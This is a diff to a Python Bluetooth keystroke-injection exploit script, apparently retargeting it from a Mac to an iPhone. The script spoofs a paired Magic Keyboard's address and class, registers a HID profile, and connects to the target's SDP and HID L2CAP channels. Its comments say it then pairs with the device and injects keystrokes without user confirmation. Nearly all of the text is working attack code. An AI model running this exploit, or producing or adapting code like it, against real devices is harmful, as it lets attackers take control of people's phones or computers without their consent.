@@ -4,12 +4,14 @@ import argparse
 import re
 import sys
 import time
+from multiprocessing import Process
 from subprocess import Popen, PIPE, STDOUT
 
 from injector.helpers import assert_address, log, run
 from injector.client import KeyboardClient
 from injector.hid import Key, Mod
 from injector.adapter import Adapter
+from injector.profile import register_hid_profile
 
 # parse command line arguments
 parser = argparse.ArgumentParser("keystroke-injection-macos.py")
@@ -27,17 +29,20 @@ assert(re.match(r"^hci\d+$", args.interface))
 run(["sudo", "service", "bluetooth", "restart"])
 time.sleep(0.5)
 
+# register a generic HID SDP profile
+profile_proc = Process(target=register_hid_profile, args=(args.interface, args.target_address))
+profile_proc.start()
+
 # setup the adapter
 # - configure name and class
 # - assume the address of the Magic Keyboard
 log.status("configuring Bluetooth adapter")
 adapter = Adapter(args.interface)
-adapter.set_name("Hi, My Name is Keyboard")
 adapter.set_class(0x002540)
 adapter.set_address(args.keyboard_address)
 client = KeyboardClient(args.target_address, auto_ack=True)
 
-# connect to Service Discovery Protocol on the Mac (L2CAP port 1)
+# connect to Service Discovery Protocol on the iPhone (L2CAP port 1)
 log.status("connecting to SDP")
 while not client.connect_sdp():
   log.debug("connecting to SDP")
@@ -47,19 +52,19 @@ log.success("connected to SDP (L2CAP 1) on target")
 # instruct the user to unplug the keyboard
 log.notice("""
 
-----------------------------------------------------------------
-| Unplug the Magic Keyboard from the Mac to trigger the attack |
-----------------------------------------------------------------
+------------------------------------------------------------------------------
+| Connect to the paired Magic Keyboard from Bluetooth settings on the iPhone |
+------------------------------------------------------------------------------
 """)
 
-# wait for an SDP connection from the Mac
-# - when the user unplugs the keyboard from the Mac, the Mac immediately
+# wait for an SDP connection from the iPhone
+# - when the user unplugs the keyboard from the iPhone, the iPhone immediately
 #   connects to the SDP service on the Magic Keyboard
 # - because we are spoofing the Magic Keyboard while connecting to the
-#   SDP service running on the Mac, the Mac thinks we are the keyboard,
+#   SDP service running on the iPhone, the iPhone thinks we are the keyboard,
 #   and starts connecting to our machine
 # - when we see the SDP connection attempt, we are able to pair with the
-#   Mac and inject keystrokes, without user confirmationgged
+#   iPhone and inject keystrokes, without user confirmationgged
 with Popen('sudo hcidump -i %s' % adapter.iface, stdout = PIPE, stderr = STDOUT, shell = True) as p:
   while True:
     line = p.stdout.readline()
@@ -69,35 +74,35 @@ with Popen('sudo hcidump -i %s' % adapter.iface, stdout = PIPE, stderr = STDOUT,
     if not line: break
     time.sleep(0.001)
 
-# connect to HID Control on the Mac (L2CAP port 17)
+# connect to HID Control on the iPhone (L2CAP port 17)
 log.status("connecting to HID Control")
 start = time.time()
-while not client.connect_hid_control():
+while not client.connect_hid_control(timeout=1):
   log.debug("connecting to HID Control")
   time.sleep(0.01)
   if time.time() - start >= 10:
-    log.error("failed to connect to HID Control on the Mac")
+    log.error("failed to connect to HID Control on the iPhone")
     adapter.down()
     sys.exit(1)
 log.success("connected to HID Control (L2CAP 17) on target")
 
-# connect to HID Interrupt on the Mac (L2CAP port 19)
+# connect to HID Interrupt on the iPhone (L2CAP port 19)
 log.status("connecting to HID Interrupt")
 start = time.time()
-while not client.connect_hid_interrupt():
+while not client.connect_hid_interrupt(timeout=1):
   log.debug("connecting to HID Interrupt")
   time.sleep(0.01)
   if time.time() - start >= 10:
-    log.error("failed to connect to HID Interrupt on the Mac")
+    log.error("failed to connect to HID Interrupt on the iPhone")
     adapter.down()
     sys.exit(1)
 log.success("connected to HID Interrupt (L2CAP 19) on target")
 
 # send an empty keyboard report
 # - this will kick off a short exchange on HID Control,
-#   where the Mac attempts to read some properties of the
+#   where the iPhone attempts to read some properties of the
 #   keyboard
-# - the KeyboardClient replies to each message from the Mac
+# - the KeyboardClient replies to each message from the iPhone
 #   with a single 0x00 byte
 # - after a brief exchange (1-2 seconds), we can inject keystrokes
 client.send_keyboard_report()
